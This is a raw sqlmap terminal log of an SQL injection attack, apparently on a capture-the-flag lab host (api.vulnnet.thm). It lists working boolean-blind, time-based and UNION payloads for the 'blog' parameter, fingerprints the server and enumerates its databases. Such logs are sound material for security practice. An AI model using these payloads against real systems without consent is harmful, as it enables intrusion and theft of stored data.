        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:25:25 /2022-12-16/

[20:25:25] [INFO] resuming back-end DBMS 'mysql' 
[20:25:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:25:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:25:25] [INFO] fetching database names
[20:25:25] [WARNING] reflective value(s) found and filtering out
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[20:25:25] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:25:25 /2022-12-16/

